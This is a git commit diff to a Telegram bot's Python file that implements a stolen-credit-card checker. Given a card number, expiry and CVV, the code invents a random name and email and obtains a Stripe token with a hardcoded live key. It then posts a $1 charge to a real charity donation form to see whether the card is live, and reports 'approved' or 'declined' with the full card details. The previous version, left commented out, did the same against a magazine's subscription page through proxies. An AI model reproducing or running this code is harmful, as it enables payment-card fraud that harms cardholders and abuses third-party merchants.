9c6e9eb8c5bb7bab899eca69962b87e48109e26e
royalrebe <108943414+royalrebe@users.noreply.github.com>
2022-08-13 01:59:37 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -7,6 +7,9 @@ import random
 import yaml
 import asyncio
 import re
+import httpx
+
+from datetime import datetime
 
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.utils.exceptions import Throttled
@@ -180,155 +183,265 @@ TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
 
 
 @dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
-async def ch(message: types.Message):
-    await message.answer_chat_action('typing')
-    tic = time.perf_counter()
-    ID = message.from_user.id
-    FIRST = message.from_user.first_name
-    try:
-        await dp.throttle('chk', rate=ANTISPAM)
-    except Throttled:
-        await message.reply('<b>Too many requests!</b>\n'
-                            f'Blocked For {ANTISPAM} seconds')
-    else:
-        if message.reply_to_message:
-            cc = message.reply_to_message.text
-        else:
-            cc = message.text[len('/chk '):]
+async def st_charge(event):
+    cc = event.message.message[len('.st '):]
+    reply_msg = await event.get_reply_message()
+    if reply_msg:
+        cc = reply_msg.message
+    x = re.findall(r'\d+', cc)
+    ccn = x[0]
+    mm = x[1]
+    yy = x[2]
+    cvv = x[3]
+    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
+    if not ccn.startswith(VALID):
+        return await event.edit('**Invalid CC Type**')
+    start = time.time()
 
-        if len(cc) == 0:
-            return await message.reply("<b>No Card to chk</b>")
+    letters = string.ascii_lowercase
+    First = ''.join(random.choice(letters) for i in range(6))
+    Last = ''.join(random.choice(letters) for i in range(6))
+    Name = f'{First}+{Last}'
+    Email = f'{First}.{Last}@gmail.com'
 
-        x = re.findall(r'\d+', cc)
-        ccn = x[0]
-        mm = x[1]
-        yy = x[2]
-        cvv = x[3]
-        if mm.startswith('2'):
-            mm, yy = yy, mm
-        if len(mm) >= 3:
-            mm, yy, cvv = yy, cvv, mm
-        if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
-        BIN = ccn[:6]
-        if BIN in BLACKLISTED:
-            return await message.reply('<b>BLACKLISTED BIN</b>')
-        # get guid muid sid
+    async with httpx.AsyncClient() as client:
         headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/x-www-form-urlencoded"
         }
+        r = await client.post('https://m.stripe.com/6', headers=headers)
+        Muid = r.json()['muid']
+        Sid = r.json()['sid']
+        Guid = r.json()['guid']
 
-        b = session.get('https://ip.seeip.org/', proxies=proxies).text
-
-        s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
-        r = s.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
-
-        # hmm
-        load = {
+        payload = {
             "guid": Guid,
             "muid": Muid,
             "sid": Sid,
-            "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
+            "key": "pk_live_RhohJY61ihLIp0HRdJaZj8vj",
             "card[name]": Name,
             "card[number]": ccn,
             "card[exp_month]": mm,
             "card[exp_year]": yy,
             "card[cvc]": cvv
-        }
-
-        header = {
-            "accept": "application/json",
+            }
+        head = {
+            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
             "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
+            "accept": "application/json",
             "origin": "https://js.stripe.com",
             "referer": "https://js.stripe.com/",
             "accept-language": "en-US,en;q=0.9"
+            }
+
+        resq = await client.post('https://api.stripe.com/v1/tokens',
+                               data=payload, headers=head)
+        Id = resq.json()['id']
+        Country = resq.json()['card']['country']
+        Brand = resq.json()['card']['brand']
+
+        load = {
+          "action": "wp_full_stripe_payment_charge",
+          "formName": "Donate",
+          "fullstripe_name": Name,
+          "fullstripe_email": Email,
+          "fullstripe_custom_amount": 1,
+          "stripeToken": Id
         }
-
-        rx = session.post('https://api.stripe.com/v1/tokens',
-                          data=load, headers=header, proxies=proxies)
-        token = rx.json()['id']
-        LastF = f'************{ccn[-4:]}'
-
-        payload = {
-            "subscription_type": "digital",
-            "first_name": First,
-            "last_name": Last,
-            "email": Email,
-            "login_pass": PWD,
-            "confirm_pass": PWD,
-            "shipping_country": "United+States",
-            "card_number": LastF,
-            "card_cvc": cvv,
-            "card_expiry_month": mm,
-            "card_expiry_year": yy,
-            "action": "register",
-            "stripe_token": token,
-            "last4": token
+        header = {
+          "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
+          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "accept": "application/json, text/javascript, */*; q=0.01",
+          "accept-language": "en-US,en;q=0.9"
         }
+        cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
+        req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php',
+                                data=load, headers=header, cookies=cookie)
+        msg = req.json()["msg"]
+        end = time.time()
 
-        head = {
-            "accept": "*/*",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "origin": "https://preludemag.com",
-            "referer": "https://preludemag.com/subscribe/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+        if 'security code is' in req.text:
+            await event.edit(f'✅>**STRIPE 1$**\n'+
+                             f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'+
+                             f'**Msg**==> `{msg}`\n'+
+                             f'**Brand**==> {Brand}\n'+
+                             f'**Country**==> {Country}\n'+
+                             f'**Time-Stamp** ==> {datetime.now()}\n'+
+                             f'**Time-Took** ==> {end-start}\n'+
+                             f'**Userbot-By** ~ @Xbinner')
 
-        ri = session.post('https://preludemag.com/subscribe/', data=payload,
-                          headers=head, proxies=proxies)
-        toc = time.perf_counter()
+        elif "true" in req.text:
+            await event.edit(f'✅>**STRIPE 1$**\n'+
+                             f'**CC**==> `{ccn}|{mm}|{yy}|{cvv}`\n'+
+                             f'**Msg**==> `{msg}`\n'+
+                             f'**Brand**==> {Brand}\n'+
+                             f'**Country**==> {Country}\n'+
+                             f'**Time-Stamp** ==> {datetime.now()}\n'+
+                             f'**Time-Took** ==> {end-start}\n'+
+                             f'**Userbot-By** ~ @Xbinner')
+        else:
+            await event.edit(f'❌>**STRIPE 1$**\n'+
+                             f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'+
+                             f'**Msg**==> `{msg}`\n'+
+                             f'**Brand**==> {Brand}\n'+
+                             f'**Country**==> {Country}\n'+
+                             f'**Time-Stamp** ==> {datetime.now()}\n'+
+                             f'**Time-Took** ==> {end-start}\n'+
+                             f'**Userbot-By** ~ @Xbinner')
 
-        if 'success' in ri.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #ApprovedCVV
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
 
-        if 'incorrect_cvc' in ri.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #ApprovedCCN
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
 
-        if 'declined' in ri.text:
-            return await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ Declined
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
+# async def ch(message: types.Message):
+#     await message.answer_chat_action('typing')
+#     tic = time.perf_counter()
+#     ID = message.from_user.id
+#     FIRST = message.from_user.first_name
+#     try:
+#         await dp.throttle('chk', rate=ANTISPAM)
+#     except Throttled:
+#         await message.reply('<b>Too many requests!</b>\n'
+#                             f'Blocked For {ANTISPAM} seconds')
+#     else:
+#         if message.reply_to_message:
+#             cc = message.reply_to_message.text
+#         else:
+#             cc = message.text[len('/chk '):]
 
-        await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
+#         if len(cc) == 0:
+#             return await message.reply("<b>No Card to chk</b>")
+
+#         x = re.findall(r'\d+', cc)
+#         ccn = x[0]
+#         mm = x[1]
+#         yy = x[2]
+#         cvv = x[3]
+#         if mm.startswith('2'):
+#             mm, yy = yy, mm
+#         if len(mm) >= 3:
+#             mm, yy, cvv = yy, cvv, mm
+#         if len(ccn) < 15 or len(ccn) > 16:
+#             return await message.reply('<b>Failed to parse Card</b>\n'
+#                                        '<b>Reason: Invalid Format!</b>')   
+#         BIN = ccn[:6]
+#         if BIN in BLACKLISTED:
+#             return await message.reply('<b>BLACKLISTED BIN</b>')
+#         # get guid muid sid
+#         headers = {
+#             "user-agent": UA,
+#             "accept": "application/json, text/plain, */*",
+#             "content-type": "application/x-www-form-urlencoded"
+#         }
+
+#         b = session.get('https://ip.seeip.org/', proxies=proxies).text
+
+#         s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
+#         r = s.json()
+#         Guid = r['guid']
+#         Muid = r['muid']
+#         Sid = r['sid']
+
+#         # hmm
+#         load = {
+#             "guid": Guid,
+#             "muid": Muid,
+#             "sid": Sid,
+#             "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
+#             "card[name]": Name,
+#             "card[number]": ccn,
+#             "card[exp_month]": mm,
+#             "card[exp_year]": yy,
+#             "card[cvc]": cvv
+#         }
+
+#         header = {
+#             "accept": "application/json",
+#             "content-type": "application/x-www-form-urlencoded",
+#             "user-agent": UA,
+#             "origin": "https://js.stripe.com",
+#             "referer": "https://js.stripe.com/",
+#             "accept-language": "en-US,en;q=0.9"
+#         }
+
+#         rx = session.post('https://api.stripe.com/v1/tokens',
+#                           data=load, headers=header, proxies=proxies)
+#         token = rx.json()['id']
+#         LastF = f'************{ccn[-4:]}'
+
+#         payload = {
+#             "subscription_type": "digital",
+#             "first_name": First,
+#             "last_name": Last,
+#             "email": Email,
+#             "login_pass": PWD,
+#             "confirm_pass": PWD,
+#             "shipping_country": "United+States",
+#             "card_number": LastF,
+#             "card_cvc": cvv,
+#             "card_expiry_month": mm,
+#             "card_expiry_year": yy,
+#             "action": "register",
+#             "stripe_token": token,
+#             "last4": token
+#         }
+
+#         head = {
+#             "accept": "*/*",
+#             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+#             "user-agent": UA,
+#             "origin": "https://preludemag.com",
+#             "referer": "https://preludemag.com/subscribe/",
+#             "accept-language": "en-US,en;q=0.9"
+#         }
+
+#         ri = session.post('https://preludemag.com/subscribe/', data=payload,
+#                           headers=head, proxies=proxies)
+#         toc = time.perf_counter()
+
+#         if 'success' in ri.text:
+#             return await message.reply(f'''
+# ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+# <b>STATUS</b>➟ #ApprovedCVV
+# <b>MSG</b>➟ {ri.text}
+# <b>PROXY-IP</b> <code>{b}</code>
+# <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+# <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+# <b>OWNER</b>: {await is_owner(ID)}
+# <b>BOT</b>: @{BOT_USERNAME}''')
+
+#         if 'incorrect_cvc' in ri.text:
+#             return await message.reply(f'''
+# ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+# <b>STATUS</b>➟ #ApprovedCCN
+# <b>MSG</b>➟ {ri.text}
+# <b>PROXY-IP</b> <code>{b}</code>
+# <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+# <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+# <b>OWNER</b>: {await is_owner(ID)}
+# <b>BOT</b>: @{BOT_USERNAME}''')
+
+#         if 'declined' in ri.text:
+#             return await message.reply(f'''
+# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+# <b>STATUS</b>➟ Declined
+# <b>MSG</b>➟ {ri.text}
+# <b>PROXY-IP</b> <code>{b}</code>
+# <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+# <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+# <b>OWNER</b>: {await is_owner(ID)}
+# <b>BOT</b>: @{BOT_USERNAME}''')
+
+#         await message.reply(f'''
+# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+# <b>STATUS</b>➟ DEAD
+# <b>MSG</b>➟ {ri.text}
+# <b>PROXY-IP</b> <code>{b}</code>
+# <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+# <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+# <b>OWNER</b>: {await is_owner(ID)}
+# <b>BOT</b>: @{BOT_USERNAME}''')
 
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, loop=loop)
+    
